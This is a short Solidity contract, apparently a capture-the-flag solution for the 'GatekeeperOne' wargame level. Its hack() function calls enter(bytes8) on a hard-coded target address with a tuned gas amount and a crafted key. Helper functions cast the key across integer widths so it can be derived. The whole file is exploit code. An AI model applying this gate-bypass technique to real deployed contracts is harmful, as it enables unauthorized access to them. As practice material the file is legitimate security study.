// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './GateKeeperOne.sol';

contract HackGateOne {

  using SafeMath for uint256;
  GateKeeperOne gateko = GateKeeperOne(0xEa971eA40946b541a81716E959ce51Bddb3dFD4D);
  address gatekoadd = 0xEa971eA40946b541a81716E959ce51Bddb3dFD4D;

  function hack(bytes32 _gateKey) public {
    gatekoadd.call.value(0 ether).gas(1075173)(abi.encodeWithSignature("enter(bytes8)", bytes8(_gateKey)));
  }

  function get8(bytes32 _gateKey) view public returns (bytes8) {
      return bytes8(_gateKey);
  }

  function get16(uint64 _gateKey) view public returns (uint16) {
      return uint16(_gateKey);
  }

  function get16add(address _gateKey) view public returns (uint16) {
      return uint16(_gateKey);
  }

  function get32(uint64 _gateKey) view public returns (uint32) {
      return uint32(_gateKey);
  }

  function get64(bytes8 _gateKey) view public returns (uint64) {
      return uint64(_gateKey);
  }

}